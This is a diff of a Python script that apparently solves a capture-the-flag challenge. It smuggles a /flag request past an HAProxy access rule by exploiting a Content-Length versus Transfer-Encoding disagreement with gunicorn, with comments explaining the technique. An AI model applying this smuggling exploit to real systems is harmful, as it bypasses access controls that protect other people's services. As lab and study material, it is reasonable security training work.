@@ -9,18 +9,18 @@ PORT = 8001
 # HAProxy uses the content length header (CL), because HAProxy ignores chunked encoding header due to adding the character 0x0b
 # by aligning the content length properly it will include the flag request as part of the body for HAProxy allowing to bypass the /flag restriction
 # gunicorn will use the chunked encoding header (TE), meaning the body of the hello_request will end after the 0
-# so it sees flag_request as a new request instead of part of the body of the hello_request 
+# so it sees flag_request as a new request instead of part of the body of the hello_request
 # gunicorn will handle them separately as two requests, resulting in two responses back to HAProxy
 # to retrieve the second response we send an extra request
 
 flag_request_builder = Request_Builder()
 flag_request_builder.url = "/flag"
-flag_request_builder.host = "{}:{}".format(HOST, PORT)
+flag_request_builder.host = HOST
 flag_request = flag_request_builder.build()
 
 hello_request_builder = Request_Builder()
 hello_request_builder.url = "/hello"
-hello_request_builder.host = "{}:{}".format(HOST, PORT)
+hello_request_builder.host = HOST
 hello_request_builder.add_content_length_header = True
 # body is empty, because we the flag request after manually
 # but for HAProxy the content-length must be big enough to include the flag request so it will be smuggled
@@ -33,7 +33,7 @@ hello_request = hello_request_builder.build()
 
 extra_request_builder = Request_Builder()
 extra_request_builder.url = "/hello"
-extra_request_builder.host = "{}:{}".format(HOST, PORT)
+extra_request_builder.host = HOST
 extra_request = extra_request_builder.build()
 
 msg = hello_request + flag_request + extra_request
